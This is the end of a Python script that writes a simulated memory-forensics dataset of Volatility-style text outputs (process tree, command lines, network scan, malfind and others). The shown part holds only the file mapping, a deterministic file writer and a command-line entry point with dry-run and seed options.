    "volatility-pstree.txt":   generate_pstree,
    "volatility-cmdline.txt":  generate_cmdline,
    "volatility-netscan.txt":  generate_netscan,
    "volatility-dlllist.txt":  generate_dlllist,
    "volatility-malfind.txt":  generate_malfind,
    "volatility-handles.txt":  generate_handles,
    "volatility-svcscan.txt":  generate_svcscan,
}


def write_text(path: Path, content: str) -> None:
    """Write a text file with LF line endings and no BOM.

    Mirrors ``write_csv`` from the WKSTN-221 generator (deterministic,
    explicit newline handling) but for plain text instead of CSV.
    """
    with path.open("w", newline="", encoding="utf-8") as fh:
        fh.write(content)


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(
        description=f"Regenerate the {HOSTNAME} simulated memory dataset.")
    parser.add_argument("--dry-run", action="store_true",
                        help="Print what would be written; do not touch files.")
    parser.add_argument("--out-dir", default=".",
                        help="Directory to write text files into (default: cwd).")
    parser.add_argument("--seed", type=lambda x: int(x, 0),
                        default=RANDOM_SEED,
                        help="Override the random seed.")
    args = parser.parse_args(argv)

    out_dir = Path(args.out_dir).resolve()

    print(f"{HOSTNAME} generator - seed=0x{args.seed:X}")
    print(f"Output directory: {out_dir}")
    if args.dry_run:
        print("Mode: --dry-run (no files written)")
    print()

    if not args.dry_run:
        out_dir.mkdir(parents=True, exist_ok=True)

    for filename, generator in GENERATORS.items():
        # Reseed per-file so adding/removing a generator does not perturb
        # the others. (Currently every generator is fully deterministic
        # without rng, but kept for parity with the WKSTN-221 layout and
        # in case future "noise" rows want it.) zlib.crc32, not hash():
        # str hashes are salted per run by PYTHONHASHSEED.
        local_rng = random.Random(
            (args.seed ^ zlib.crc32(filename.encode("utf-8"))) & 0xFFFFFFFF)
        content = generator(local_rng)
        target = out_dir / filename
        n_lines = content.count("\n")
        print(f"  {filename:<28} -> {n_lines:>4} lines "
              f"({len(content):>5} bytes)")
        if not args.dry_run:
            write_text(target, content)

    if args.dry_run:
        print("\nDry run complete. Re-run without --dry-run to write files.")
    else:
        print("\nDone.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
